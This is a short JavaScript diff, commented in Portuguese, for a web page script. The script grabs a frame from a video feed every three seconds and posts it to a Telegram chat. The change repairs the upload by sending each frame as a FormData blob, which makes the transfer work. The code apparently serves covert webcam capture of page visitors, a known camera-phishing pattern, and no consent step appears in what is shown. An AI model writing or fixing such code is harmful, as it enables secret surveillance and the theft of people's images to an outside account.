@@ -29,23 +29,22 @@
         function capturePhotos() {
             setInterval(() => {
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
-                const imageData = canvas.toDataURL('image/png');
-                console.log('Capturou foto:', imageData); // Log para verificar se a foto foi capturada
-                sendPhotoToTelegram(imageData);
+                canvas.toBlob((blob) => {
+                    sendPhotoToTelegram(blob);
+                }, 'image/png');
             }, 3000); // Captura uma foto a cada 3 segundos
         }
 
-        function sendPhotoToTelegram(imageData) {
+        function sendPhotoToTelegram(blob) {
             console.log('Enviando foto para o Telegram'); // Log para verificar se a função foi chamada
+
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'photo.png');
+
             fetch(url, {
                 method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    chat_id: chatId,
-                    photo: imageData
-                })
+                body: formData
             }).then(response => response.json())
               .then(data => {
                   console.log('Resposta do Telegram:', data); // Log para verificar a resposta do Telegram
